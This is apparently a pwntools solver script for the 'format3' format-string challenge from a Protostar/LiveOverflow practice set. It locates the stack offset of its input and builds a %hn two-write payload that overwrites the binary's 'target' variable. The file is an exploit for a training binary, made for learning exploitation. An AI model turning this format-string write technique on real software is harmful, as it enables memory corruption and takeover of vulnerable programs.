#!/usr/bin/env python3

from __future__ import annotations

import sys
from pathlib import Path

from pwn import ELF, log, p32, process

sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402

SUCCESS = b"you have modified the target"

def find_idx(prog: str, addr: int) -> int | None:
    needle = f"{addr:08x}".encode()
    for idx in range(1, 80):
        probe = p32(addr) + (f".%{idx}$08x.").encode() + b"\n"
        io = process([prog])
        io.send(probe)
        io.shutdown("send")
        out = io.recvall(timeout=2)
        if needle in out:
            return idx
    return None


def exploit(prog: str, target_addr: int, idx: int) -> bool:
    value = 0x01025544
    lo = value & 0xFFFF
    hi = (value >> 16) & 0xFFFF

    addrs = p32(target_addr) + p32(target_addr + 2)
    k1 = idx
    k2 = idx + 1

    count = len(addrs)
    pad1 = (lo - count) % 0x10000
    if pad1 == 0:
        pad1 = 0x10000
    count += pad1
    pad2 = (hi - count) % 0x10000
    if pad2 == 0:
        pad2 = 0x10000

    payload = addrs + (f"%{pad1}c%{k1}$hn%{pad2}c%{k2}$hn").encode() + b"\n"
    io = process([prog])
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=3)
    return SUCCESS in out

def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("format3"))
    elf = ELF(prog)
    tgt = elf.symbols.get("target")
    if not tgt:
        log.failure("target symbol not found")
        return 2

    idx = find_idx(prog, tgt)
    if idx is None:
        log.failure("format3 failed to locate idx")
        return 2
    if exploit(prog, tgt, idx):
        log.success("format3 solved (idx=%d)", idx)
        return 0
    log.failure("format3 exploit failed (idx=%d)", idx)
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
